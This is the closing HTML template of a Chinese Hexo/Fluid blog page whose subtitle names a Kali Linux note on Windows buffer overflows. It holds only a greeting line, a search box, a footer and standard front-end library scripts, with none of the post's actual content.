  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->

  <div class="col-lg-7 mx-auto nopadding-md">
    <div class="container custom post-content mx-auto">
      <h3>你好，Tomas，生命仍在继续......</h3>
    </div>
  </div>


    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
<script  src="/js/main.js" ></script>


  <script  src="/js/lazyload.js" ></script>



  
  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var navHeight = $('#navbar').height();
      var toc = $('#toc');
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;
      var tocLimMax = 2 * boardTop + boardCtn.height();

      $(window).scroll(function () {
        var tocLimMin = $('#toc-start').offset().top - navHeight;
        var scroH = document.body.scrollTop + document.documentElement.scrollTop;

        if (tocLimMin <= scroH && scroH <= tocLimMax) {
          toc.css({
            'display': 'block',
            'position': 'fixed',
            'top': navHeight,
          });
        } else if (scroH <= tocLimMin) {
          toc.css({
            'position': '',
            'top': '',
          });
        } else if (scroH > tocLimMax) {
          toc.css('display', 'none');
        }
      });
      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc > p').css('visibility', 'visible');
      }
      var offset = boardCtn.css('margin-right')
      $('#toc-ctn').css({
        'right': offset
      })
    });
  </script>





  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>





  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




<!-- Plugins -->



  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "Kali Linux笔记(二十七)：Window缓冲区溢出&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>












</body>
</html>
